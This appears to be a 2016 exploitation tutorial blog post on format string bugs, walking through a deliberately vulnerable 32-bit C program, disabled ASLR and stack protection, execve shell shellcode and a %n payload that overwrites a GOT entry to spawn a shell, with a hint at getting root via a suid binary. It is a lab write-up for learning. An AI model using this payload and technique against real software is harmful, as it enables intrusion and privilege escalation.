@@ -1,0 +1,656 @@
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <title>Bad Hombre's Blog</title>
+  <meta name="theme-color" content="#222222" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <script src="https://bad-hombres.github.io//blog/js/jquery.min.js"></script>
+  <script src="https://bad-hombres.github.io//blog/js/bootstrap.min.js"></script>
+  <script src="https://bad-hombres.github.io//blog/js/header.js"></script>
+  <script src="https://bad-hombres.github.io//blog/js/toc.js"></script>
+  <link href="https://bad-hombres.github.io//blog/css/bootstrap.min.css" rel="stylesheet">
+  <link href="https://bad-hombres.github.io//blog/css/theme.css" rel="stylesheet">
+  <link href="https://bad-hombres.github.io//blog/css/syntax.css" rel="stylesheet">
+  <link href="https://bad-hombres.github.io//blog/css/font-awesome/css/font-awesome.min.css" rel="stylesheet">
+  <link rel="shortcut icon" href="https://bad-hombres.github.io//blog/favicon.ico" type="image/x-icon">
+  <link rel="icon" href="https://bad-hombres.github.io//blog/favicon.ico" type="image/x-icon">
+</head>
+
+<body>
+
+  
+<script type="text/javascript">
+
+  var _gaq = _gaq || [];
+  _gaq.push(['_setAccount', 'UA-99735361-1']);
+  _gaq.push(['_trackPageview']);
+
+  (function() {
+    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+  })();
+
+</script>
+
+
+  
+
+
+ <script type="text/javascript">
+  WebFontConfig = {
+    google: {
+      families: ['Ubuntu::latin']
+    }
+  };
+  (function() {
+    var wf = document.createElement('script');
+    wf.src = ('https:' == document.location.protocol ? 'https' : 'http') +
+      '://ajax.googleapis.com/ajax/libs/webfont/1/webfont.js';
+    wf.type = 'text/javascript';
+    wf.async = 'true';
+    var s = document.getElementsByTagName('script')[0];
+    s.parentNode.insertBefore(wf, s);
+  })();
+</script>
+
+  <nav class="navbar navbar-inverse navbar-fixed-top">
+    <div class="container">
+      <div class="navbar-header">
+        <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+          <span class="icon-bar"></span>
+          <span class="icon-bar"></span>
+          <span class="icon-bar"></span>
+        </button>
+        <a class="navbar-brand" href="https://bad-hombres.github.io//blog/">Bad Hombre's Blog</a>
+      </div>
+      <div class="collapse navbar-collapse">
+        <ul class="nav navbar-nav">
+          <li><a href="https://bad-hombres.github.io//blog/">/home</a></li>
+          <li><a href="https://bad-hombres.github.io//blog/archive.html">/archive</a></li>
+          <li><a href="https://bad-hombres.github.io//blog/tags.html">/tags</a></li>
+          <li><a href="https://bad-hombres.github.io//blog/about.html">/about</a></li>
+        </ul>
+      </div>
+    </div>
+  </nav>
+
+
+<div class="wrapper">
+  <div class="content">
+    <div class="container container-center">
+      <div class="row">
+        <div class="col-md-8">
+          <div class="article">
+            <div class="well">
+              <h1><a href="https://bad-hombres.github.io//blog/2016/11/01/Format-Strings.html">Format Strings</a></h1>
+              <div class="post-meta">
+                <div class="post-time">
+                  <i class="fa fa-calendar"></i>
+                  <time>01 Nov 2016</time>
+                </div>
+                <ul>
+                  
+                    <li><a href="https://bad-hombres.github.io//blog/tag/linux">linux</a></li>
+                  
+                    <li><a href="https://bad-hombres.github.io//blog/tag/exploit">exploit</a></li>
+                  
+                    <li><a href="https://bad-hombres.github.io//blog/tag/32bit">32bit</a></li>
+                  
+                </ul>
+              </div>
+              <div class="post-content">
+                <div id="toc" class="toc"></div>
+                <h3>Written by xirax</h3>
+                <h1 id="background">Background</h1>
+<p>Any of us who have been around a while will most likely will have done some C
+and will almost certainly come across the printf family of functions. Now
+printf and its cousins have the special ability of accepting a string argument
+which details how the data passed to it should be formatted, for example</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="cp">#include &lt;stdio.h&gt;
+</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">==</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Received string: %s"</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+  <span class="p">}</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>Save the file as hello.c and compile with</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>  $ gcc -o hello hello.c
+  $ ./hello mike
+  Received string: mike
+</code></pre>
+</div>
+
+<h1 id="problem">Problem</h1>
+<p>you can see that we received the output expected. However if the programmer was
+lazy (and most of us are) then because he was writing the string directly he may
+have just done something like the following</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="cp">#include &lt;stdio.h&gt;
+</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">==</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">printf</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+  <span class="p">}</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>Compile and run as before and you see the string still gets printed</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>  $ ./hello mike
+  mike
+</code></pre>
+</div>
+<p>but now the programmer has passed the data into printf where the format string
+is and printf will respond by parsing the input as a format string. The man page
+for printf shows us the format string specifiers that we can use in format
+strings, playaround with these and see what values you get back</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>  $ ./hello %d.%d
+  -8856.-8832
+</code></pre>
+</div>
+<p>Whoa! Where did those numbers came from? The answer is the stack our string said
+to display the next two params as decimal values, since we didnt provide them
+ourselves it pops them off the stack.</p>
+
+<h1 id="exploiting">Exploiting</h1>
+<p>This by its self can be used for data leakage by reading arbitrary data from the
+stack you could leak sensitive data stored in memory, read stack canary values
+to exploit buffer overflows in binaries where stack protection is enabled.</p>
+
+<p>Today however we are going to use this to get a shell</p>
+
+<h2 id="setup">Setup</h2>
+<p>See my post on vagrant to setup a 32 bit virtual machine. Once ssh’d into that
+machine save the following file to fmt.c</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="cm">/* fmt.c - sample program vulnerable to format string exploitation
+ * 
+ * $ gcc -o fmt fmt.c
+ * $ execstack -s fmt # make stack executable
+ */</span>
+<span class="cp">#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+</span> 
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
+    <span class="kt">char</span> <span class="n">b</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
+    <span class="n">strcpy</span><span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="n">b</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>Compile using</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>  $ gcc -fno-stack-protector -z execstack -o fmt fmt.c
+</code></pre>
+</div>
+<p>You may see a warning about format strings but as long as you end up with a fmt
+binary its all good. You also need to disable ASLR or else your shellcode will
+move about on the stack each time you run the program. As root run</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>  $ echo 0 &gt; /proc/sys/kernel/randomize_va_space
+</code></pre>
+</div>
+
+<h2 id="moving-on">Moving on</h2>
+<p>Now we hav2 our vulnerable binary lets test it</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>  $ ./fmt AAAA
+  AAAA
+</code></pre>
+</div>
+<p>looks good, now after reading the man pages for printf we found a couple of
+interesting format specifiers</p>
+<ul>
+  <li>%x lets us display a value as hex</li>
+  <li>%n writes the amount of bytes written so far to the pointer that corresponds
+to this parameter</li>
+</ul>
+
+<p>Jackpot! We can use this to write arbitrary data to a memory location that we
+control!!!! More on that later, first we need to find out how to access the data
+we supplied (so that we can provide our own address to write data to)</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>  $ ./fmt AAAA.%x.%x.%x.%x.%x.%x
+  AAAA.bffff88b.1.b7ec71c9.41414141.2e78252e.252e7825
+</code></pre>
+</div>
+<p>You can see from above that the 41414141 string is the 4th value on the stack
+(0x41 hex is 65 decimal which is ascii A). Now up until now I have not mention
+direct parameter access, this allows is to not have to specify all the %x’s and
+reference the 4th parameter as %4$x, see below</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>  $ ./fmt AAAA.%4\$x
+  AAAA.41414141
+</code></pre>
+</div>
+<p>You can now see that we are fetching our 4 A’s of the stack (we have to escape
+the $ as it is a special shell character). With the help of the %n specifier we
+are going to write the address of some shellcode that we’ll place on the stack
+over the address of a function in the Global Offset Table (GOT for short) so to
+sum up those 4 A’s need to become the address of an entry in the GOT (and needs
+to be called after the printf function call) and we need to write enough data so
+that the %n value is equal to the address of our shell code.</p>
+
+<h2 id="shellcode">Shellcode</h2>
+<p>I am not going to explain how I crafted this shellcode (I’ll write another post
+on how I did that). Run the below command in order to set up an environment
+variable with our shell code in</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>  $ export EGG=$(python -c 'print "\x90" * 64 +
+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')
+</code></pre>
+</div>
+<p>Here I’m using pythons ability to print hex chars to save the shellcode into the
+EGG environment variable (see shellstorm.org for more examples of shellcode)</p>
+
+<h2 id="data-gathering">Data Gathering</h2>
+<p>Now in order to exploit this vulnerability we need to gather a few pieces of
+data</p>
+
+<ul>
+  <li>Address of function in GOT to overwrite.</li>
+</ul>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>  $ objdump -R fmt
+
+  fmt:     file format elf32-i386
+
+  DYNAMIC RELOCATION RECORDS
+  OFFSET   TYPE              VALUE 
+  08049ff0 R_386_GLOB_DAT    __gmon_start__
+  0804a000 R_386_JUMP_SLOT   printf
+  0804a004 R_386_JUMP_SLOT   strcpy
+  0804a008 R_386_JUMP_SLOT   __gmon_start__
+  0804a00c R_386_JUMP_SLOT   __libc_start_main
+  0804a010 R_386_JUMP_SLOT   putchar
+</code></pre>
+</div>
+<p>we’ll use the address of putchar as this gets called immediately after the
+printf function so the address we are writing to is 0x0894a010 (this 32 bit / 4
+byte address will become our A’s in the payload string this means our format
+string  will become $(python -c ‘print “\x10\xa0\x04\x08”’).%4$n Which
+translated means write the number 5 to the address 0x0804a010. Why the number 5?
+Well we have written 4 bytes for the address (where the A’s used to be) plus 1
+period we used as a spacer. You may be thinking wait why is the address
+backwards? Well this is because this machine is little endian (go and google!!).
+Lets verify this in gdb!!</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>  $ gdb fmt
+  gdb-peda$ run $(python -c 'print "\x10\xa0\x04\x08"').%4\$n
+  [----------------------------------registers-----------------------------------]
+  EAX: 0x5 
+  EBX: 0xb7fd1ff4 --&gt; 0x1a0d7c 
+  ECX: 0x0 
+  EDX: 0x0 
+  ESI: 0x0 
+  EDI: 0x0 
+  EBP: 0xbffff698 --&gt; 0x0 
+  ESP: 0xbffff5fc --&gt; 0x8048480 (&lt;main+60&gt;:   leave)
+  EIP: 0x5
+  EFLAGS: 0x210282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
+  [-------------------------------------code-------------------------------------]
+  Invalid $PC address: 0x5
+  [------------------------------------stack-------------------------------------]
+  0000| 0xbffff5fc --&gt; 0x8048480 (&lt;main+60&gt;:  leave)
+  0004| 0xbffff600 --&gt; 0xa ('\n')
+  0008| 0xbffff604 --&gt; 0xbffff88a --&gt; 0x804a010 --&gt; 0x5 
+  0012| 0xbffff608 --&gt; 0x1 
+  0016| 0xbffff60c --&gt; 0xb7ec71c9 (test   eax,eax)
+  0020| 0xbffff610 --&gt; 0x804a010 --&gt; 0x5 
+  0024| 0xbffff614 (".%4$n")
+  0028| 0xbffff618 --&gt; 0x6e ('n')
+  [------------------------------------------------------------------------------]
+  Legend: code, data, rodata, value
+  Stopped reason: SIGSEGV
+  0x00000005 in ?? ()
+  gdb-peda$ x/xw 0x0804a010
+  0x804a010 &lt;putchar@got.plt&gt;:	0x00000005
+  gdb-peda$ 
+</code></pre>
+</div>
+<p>As you can see from above the program crashed and we have verified that the
+value 5 has indeed been written to the address we wanted,</p>
+
+<ul>
+  <li>We now need to know the address of our shellcode, this address can be anywhere
+in our NOP sled (the bunch of 0x90’s we put at the beginning of our shellcode
+EGG environment variable)</li>
+</ul>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>  gdb-peda$ find 0x90909090 $esp $esp+2000
+  Searching for '0x90909090' in range: 0xbffff5ac - 0xbffffd7c
+  Found 16 results, display max 16 items:
+  [stack] : 0xbffff8d8 --&gt; 0x90909090 
+  [stack] : 0xbffff8dc --&gt; 0x90909090 
+  [stack] : 0xbffff8e0 --&gt; 0x90909090 
+  [stack] : 0xbffff8e4 --&gt; 0x90909090 
+  [stack] : 0xbffff8e8 --&gt; 0x90909090 
+  [stack] : 0xbffff8ec --&gt; 0x90909090 
+  [stack] : 0xbffff8f0 --&gt; 0x90909090 
+  [stack] : 0xbffff8f4 --&gt; 0x90909090 
+  [stack] : 0xbffff8f8 --&gt; 0x90909090 
+  [stack] : 0xbffff8fc --&gt; 0x90909090 
+  [stack] : 0xbffff900 --&gt; 0x90909090 
+  [stack] : 0xbffff904 --&gt; 0x90909090 
+  [stack] : 0xbffff908 --&gt; 0x90909090 
+  [stack] : 0xbffff90c --&gt; 0x90909090 
+  [stack] : 0xbffff910 --&gt; 0x90909090 
+  [stack] : 0xbffff914 --&gt; 0x90909090 
+  
+  gdb-peda$ x/20i 0xbffff910
+     0xbffff910:	nop
+     0xbffff911:	nop
+     0xbffff912:	nop
+     0xbffff913:	nop
+     0xbffff914:	nop
+     0xbffff915:	nop
+     0xbffff916:	nop
+     0xbffff917:	nop
+     0xbffff918:	xor    eax,eax
+     0xbffff91a:	push   eax
+     0xbffff91b:	push   0x68732f2f
+     0xbffff920:	push   0x6e69622f
+     0xbffff925:	mov    ebx,esp
+     0xbffff927:	push   eax
+     0xbffff928:	push   ebx
+     0xbffff929:	mov    ecx,esp
+     0xbffff92b:	mov    al,0xb
+     0xbffff92d:	int    0x80
+     0xbffff92f:	add    BYTE PTR [ebp+0x53],dl
+     0xbffff932:	inc    ebp
+  gdb-peda$ 
+</code></pre>
+</div>
+<p>Above we first used the find command to find 4 consecutive NOP’s on the stack
+(0x90’s) and we found a list of possible addresses, we then chose an address
+near to the bottom of the list and examined 20 instructions (x/20i) from that
+address. This looks like the assembly for an execve syscall (the 0xb going in
+the eax/al register and the int 0x80) so we found our address 0xbffff910.</p>
+
+<p>We now have all the information we need to exploit this, to recap</p>
+<ul>
+  <li>We are going to overwrite the putchar address 0x0804a010</li>
+  <li>We are going to overwrite it with the address of our shell code where is
+0xbffff910</li>
+</ul>
+
+<h2 id="crafting-the-exploit">Crafting the exploit</h2>
+<p>Armed with our information we are now going to tackle the writing the address of
+our shellcode in two parts</p>
+
+<ul>
+  <li>Write the lower order bytes. From our shellcode address this means we first
+want to write the value f910 which in decimal is 63760 now we have to take
+into account that we have already written 5 bytes and we want to use one byte
+as a spacer so this leaves us with 63754 bytes and our format string becomes</li>
+</ul>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>  gdb-peda$ run $(python -c 'print "\x10\xa0\x04\x08"').%63754u.%4\$n
+
+   [----------------------------------registers-----------------------------------]
+  EAX: 0xf910 
+  EBX: 0xb7fd1ff4 --&gt; 0x1a0d7c 
+  ECX: 0x0 
+  EDX: 0x0 
+  ESI: 0x0 
+  EDI: 0x0 
+  EBP: 0xbffff638 --&gt; 0x0 
+  ESP: 0xbffff59c --&gt; 0x8048480 (&lt;main+60&gt;:	leave)
+  EIP: 0xf910
+  EFLAGS: 0x210282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
+  [-------------------------------------code-------------------------------------]
+  Invalid $PC address: 0xf910
+  [------------------------------------stack-------------------------------------]
+  0000| 0xbffff59c --&gt; 0x8048480 (&lt;main+60&gt;:	leave)
+  0004| 0xbffff5a0 --&gt; 0xa ('\n')
+  0008| 0xbffff5a4 --&gt; 0xbffff826 --&gt; 0x804a010 --&gt; 0xf910 
+  0012| 0xbffff5a8 --&gt; 0x1 
+  0016| 0xbffff5ac --&gt; 0xb7ec71c9 (test   eax,eax)
+  0020| 0xbffff5b0 --&gt; 0x804a010 --&gt; 0xf910 
+  0024| 0xbffff5b4 (".%63754u.%4$n")
+  0028| 0xbffff5b8 ("754u.%4$n")
+  [------------------------------------------------------------------------------]
+  Legend: code, data, rodata, value
+  Stopped reason: SIGSEGV
+  0x0000f910 in ?? ()
+  gdb-peda$ x/xw 0x0804a010
+  0x804a010 &lt;putchar@got.plt&gt;:	0x0000f910
+  gdb-peda$ 
+</code></pre>
+</div>
+<p>As you can see we have written the lower order bytes to the address correctly</p>
+
+<ul>
+  <li>We now need to tackle the higher order bytes, so now that means we need to
+write bfff - F910 more bytes to the higher order bytes. But this sum works out
+to a negative figure to fix this we use a trick we do 1bfff - f910 which
+equals c6ef or 50927 in decimal. We also have to adjust the address we are
+writing too by 2 bytes (as we are writing to the higher order bytes. Our input
+string now becomes</li>
+</ul>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>  gdb-peda$ run $(python -c 'print "\x10\xa0\x04\x08" + "\x12\xa0\x04\x08"').%63750u.%4\$n.%50925u.%5\$n
+  
+  $ ps
+  [New process 8218]
+  process 8218 is executing new program: /bin/ps
+    PID TTY          TIME CMD
+   7883 pts/0    00:00:00 bash
+   8211 pts/0    00:00:00 gdb
+   8213 pts/0    00:00:00 sh
+   8218 pts/0    00:00:00 ps
+</code></pre>
+</div>
+<p>and we have a shell!! So what happened to our format string, well…..</p>
+<ol>
+  <li>We wrote 4 more bytes for the address of the higher order bytes so the %63754u
+part had to become %63750u</li>
+  <li>we added ,%50925u.%5$n to the format string the 50925 part is the 50927
+bytes we calculated that we needed to write minus the 2 extra bytes we used
+for the spacers and now we have to write this value to the 5th parameter on
+the stack which is the address of the higher order bytes of the putchar
+address (0x0804a010), we don’t need to inspect this address this time as we
+have a shell</li>
+</ol>
+
+<p>Lets just attempt this exploit outside of gdb</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>  $ ./fmt $(python -c 'print "\x10\xa0\x04\x08" + "\x12\xa0\x04\x08"').%63750u.%4\$n.%50925u.%5\$n
+  $ ps
+    PID TTY          TIME CMD
+   7883 pts/0    00:00:00 bash
+   8211 pts/0    00:00:00 gdb
+   8213 pts/0    00:00:00 sh
+   8233 pts/0    00:00:00 sh
+   8234 pts/0    00:00:00 ps
+</code></pre>
+</div>
+<p>voila! We have a shell, now we could perhaps to further verify this if you set
+the owner of the fmt bin to root (<code class="highlighter-rouge">chown root:root</code>) and set the suid bit
+(<code class="highlighter-rouge">chmod +s fmt</code>) then you will be able to exploit this an get a root shell</p>
+
+<p>Enjoy!!!</p>
+
+                
+
+<div class="share-bar">
+  <ul class="share-buttons">
+    
+    <li class="share-facebook">
+      <a href="https://www.facebook.com/sharer/sharer.php?u=https://bad-hombres.github.io//2016/11/01/Format-Strings.html" target="_blank" title="Share on Facebook">
+        <span class="fa-stack fa-lg">
+          <i class="fa fa-square-o fa-stack-2x"></i>
+          <i class="fa fa-facebook fa-stack-1x"></i>
+        </span>
+      </a>
+    </li>
+    
+
+    
+    <li class="share-twitter">
+      <a href="https://twitter.com/intent/tweet?url=https://bad-hombres.github.io//2016/11/01/Format-Strings.html&text=Format Strings" target="_blank" title="Tweet">
+        <span class="fa-stack fa-lg">
+          <i class="fa fa-square-o fa-stack-2x"></i>
+          <i class="fa fa-twitter fa-stack-1x"></i>
+        </span>
+      </a>
+    </li>
+    
+
+    
+    <li class="share-google-plus">
+      <a href="https://plus.google.com/share?url=https://bad-hombres.github.io//2016/11/01/Format-Strings.html" target="_blank" title="Share on Google Plus">
+        <span class="fa-stack fa-lg">
+          <i class="fa fa-square-o fa-stack-2x"></i>
+          <i class="fa fa-google-plus fa-stack-1x"></i>
+        </span>
+      </a>
+    </li>
+    
+
+    
+    <li class="share-linkedin">
+      <a href="http://www.linkedin.com/shareArticle?mini=true&url=https://bad-hombres.github.io//2016/11/01/Format-Strings.html&title=Format Strings&summary=Intro to format string vulnerabilities&source=" target="_blank" title="Share on LinkedIn">
+        <span class="fa-stack fa-lg">
+          <i class="fa fa-square-o fa-stack-2x"></i>
+          <i class="fa fa-linkedin fa-stack-1x"></i>
+        </span>
+      </a>
+    </li>
+    
+
+    
+    <li class="share-pinterest">
+      <a href="http://pinterest.com/pin/create/button/?urlhttps://bad-hombres.github.io//2016/11/01/Format-Strings.html=&description=Intro to format string vulnerabilities" target="_blank" title="Pin it">
+        <span class="fa-stack fa-lg">
+          <i class="fa fa-square-o fa-stack-2x"></i>
+          <i class="fa fa-pinterest fa-stack-1x"></i>
+        </span>
+      </a>
+    </li>
+    
+
+    
+    <li class="share-envelope">
+      <a href="mailto:?&subject=Format Strings&body=Intro to format string vulnerabilities https://bad-hombres.github.io//2016/11/01/Format-Strings.html" target="_blank" title="Email">
+        <span class="fa-stack fa-lg">
+          <i class="fa fa-square-o fa-stack-2x"></i>
+          <i class="fa fa-envelope-o fa-stack-1x"></i>
+        </span>
+      </a>
+    </li>
+    
+
+  </ul>
+</div>
+
+
+              </div>
+              
+              <div id="disqus_thread">
+                <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+                <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+              </div>
+              
+            </div>
+          </div>
+        </div>
+        <div class="col-md-4 hidden-xs">
+          <div class="sidebar ">
+  <h2>Recent Posts</h2>
+  <ul>
+    
+    <li><a href="https://bad-hombres.github.io//blog/2018/11/01/Buffer-Overflow-Level-2.html">Buffer Overflows: Level 2 (ret2libc)</a></li>
+    
+    <li><a href="https://bad-hombres.github.io//blog/2017/03/21/SLAE-TCP-Bind-Shell.html">SLAE: TCP Bind Shell</a></li>
+    
+    <li><a href="https://bad-hombres.github.io//blog/2016/11/03/Buffer-Overflow-Level-1.html">Buffer Overflows: Level 1 (ret2stack)</a></li>
+    
+    <li><a href="https://bad-hombres.github.io//blog/2016/11/02/Crafting-Shellcode.html">Crafting Shellcode</a></li>
+    
+    <li><a href="https://bad-hombres.github.io//blog/2016/11/01/Format-Strings.html">Format Strings</a></li>
+    
+  </ul>
+</div>
+
+<div class="sidebar">
+  <h2>Tags</h2>
+  <ul>
+    
+      <li><a href="https://bad-hombres.github.io//blog/tag/tools">tools</a></li>
+    
+      <li><a href="https://bad-hombres.github.io//blog/tag/linux">linux</a></li>
+    
+      <li><a href="https://bad-hombres.github.io//blog/tag/exploit">exploit</a></li>
+    
+      <li><a href="https://bad-hombres.github.io//blog/tag/32bit">32bit</a></li>
+    
+      <li><a href="https://bad-hombres.github.io//blog/tag/shellcode">shellcode</a></li>
+    
+      <li><a href="https://bad-hombres.github.io//blog/tag/assembly">assembly</a></li>
+    
+      <li><a href="https://bad-hombres.github.io//blog/tag/bufferoverflow">bufferoverflow</a></li>
+    
+      <li><a href="https://bad-hombres.github.io//blog/tag/slae">slae</a></li>
+    
+  </ul>
+</div>
+
+        </div>
+      </div>
+    </div>
+    
+<!-- Add Disqus comments. -->
+<div id="disqus_thread"></div>
+<script type="text/javascript">
+  /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+  var disqus_shortname = 'bad-hombres'; // required: replace example with your forum shortname
+  var disqus_identifier = "/2016/11/01/Format-Strings.html";
+
+  /* * * DON'T EDIT BELOW THIS LINE * * */
+  (function() {
+    var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+  })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+
+
+  </div>
+      <footer class="footer-distributed">
+      <div class="container">
+        <div class="footer">
+          <p>Bad Hombres &copy; 2017</p>
+          <h6>Follow us</h6>
+
+<ul class="social-media">
+
+  
+    <li>
+      <a title="bad-hombres on Github" href="https://github.com/bad-hombres" target="_blank"><i class="fa fa-github fa-2x"></i></a>
+    </li>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    <li>
+      <a title="feed.xml RSS" href="/blog/feed.xml" target="_blank"><i class="fa fa-rss fa-2x"></i></a>
+    </li>
+  
+
+</ul>
+
+
+          <p> Original theme from <a href="https://github.com/streetturtle/jekyll-clean-dark">Here</a>
+        </div>
+      </div>
+    </footer>
+  </body>
+</html>
+
+</div>
